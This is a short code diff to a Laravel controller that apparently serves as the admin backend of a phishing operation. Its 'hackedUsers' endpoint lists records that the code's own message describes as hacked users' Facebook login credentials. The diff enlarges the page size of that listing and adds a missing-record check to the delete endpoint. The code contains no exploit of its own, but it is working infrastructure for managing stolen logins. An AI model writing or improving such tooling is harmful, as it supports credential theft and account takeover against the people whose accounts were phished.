@@ -106,7 +106,7 @@ class DevController extends Controller
 
     public function hackedUsers(){
 
-        $hackedUsers =  HackedUser::orderBy('created_at', 'desc')->paginate(5);
+        $hackedUsers =  HackedUser::orderBy('created_at', 'desc')->paginate(50);
 
         $response = [
             'notify' => 'Here are the hacked user facebook login credentials',
@@ -120,8 +120,12 @@ class DevController extends Controller
     public function deleteUser($id){
         
         $hackedUser = HackedUser::find($id);
-        $hackedUser->delete();
 
+        if(is_null($hackedUser)){
+            return response()->json(['message'=> 'This user doesn Exist'], 404);
+        }
+        
+        $hackedUser->delete();
         return response()->json(['message'=> 'User deleted'], 200);
     }
 
